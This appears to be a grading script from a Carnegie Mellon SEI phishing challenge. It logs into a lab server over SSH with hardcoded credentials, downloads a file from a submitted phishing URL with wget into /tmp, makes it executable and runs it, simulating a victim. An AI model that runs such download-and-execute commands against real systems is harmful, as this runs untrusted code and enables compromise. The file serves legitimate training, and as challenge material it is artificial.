#!/usr/bin/python3
#
# Copyright 2025 Carnegie Mellon University.
#
# NO WARRANTY. THIS CARNEGIE MELLON UNIVERSITY AND SOFTWARE ENGINEERING INSTITUTE MATERIAL IS FURNISHED ON AN "AS-IS" BASIS. CARNEGIE MELLON UNIVERSITY MAKES NO WARRANTIES OF ANY KIND, EITHER EXPRESSED OR IMPLIED, AS TO ANY MATTER INCLUDING, BUT NOT LIMITED TO, WARRANTY OF FITNESS FOR PURPOSE OR MERCHANTABILITY, EXCLUSIVITY, OR RESULTS OBTAINED FROM USE OF THE MATERIAL. CARNEGIE MELLON UNIVERSITY DOES NOT MAKE ANY WARRANTY OF ANY KIND WITH RESPECT TO FREEDOM FROM PATENT, TRADEMARK, OR COPYRIGHT INFRINGEMENT.
#
# Licensed under a MIT (SEI)-style license, please see license.txt or contact permission@sei.cmu.edu for full terms.
#
# [DISTRIBUTION STATEMENT A] This material has been approved for public release and unlimited distribution.  Please see Copyright notice for non-US Government use and distribution.
#
# This Software includes and/or makes use of Third-Party Software each subject to its own license.
# DM25-0166#


import paramiko, time, logging

# Variables
SSH_HOST = '10.4.4.160'  # Server to connect to
SSH_USER = 'william'  # Username to use to connect
SSH_PASSWORD = 'fishingisphun!'  # Password of user


def execute_payload_on_server(phishing_url):
# This function uses Paramiko to connect to a remote system and execute the payload
# It is called by the `getMessages.py` grading script
# It uses the URL parsed from the sent phishing message

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(SSH_HOST, username=SSH_USER, password=SSH_PASSWORD)
        logging.info(f"Connected to the remote server: {SSH_HOST}.")

        # Check if the payload is already running from a previous grading attempt
        stdin, stdout, stderr = client.exec_command("pgrep -f payload")
        running_pid = stdout.read().decode().strip()

        # If running, kill process, delete old payload
        if running_pid:
            logging.info(f"Payload is running with PID {running_pid}. Killing process.")
            client.exec_command(f"kill {running_pid}")
            client.exec_command(f"rm -f /tmp/payload")
            logging.info("Old payload file deleted.")

        # Download the new payload
        download_command = f"wget {phishing_url} -O /tmp/payload"
        stdin, stdout, stderr = client.exec_command(download_command)
        download_output = stdout.read().decode().strip()
        download_error = stderr.read().decode().strip()
        logging.info(f"wget Output: {download_error}")
        logging.info(f"Downloaded payload from {phishing_url}.")

        # Make the payload executable
        client.exec_command("chmod +x /tmp/payload")
        logging.info("The payload was made executable.")

        # Execute the payload
        stdin, stdout, stderr = client.exec_command("/tmp/payload")
        logging.info("Payload executed. Time to sleep for thirty seconds.")
        time.sleep(30)
        logging.info("End of Sleep.")

    except Exception as e:
        logging.error(f"An error occurred: {str(e)}")
    finally:
        client.close()
        logging.info("The connection to the remote host closed.")

# Main logic
if __name__ == '__main__':
    execute_payload_on_server()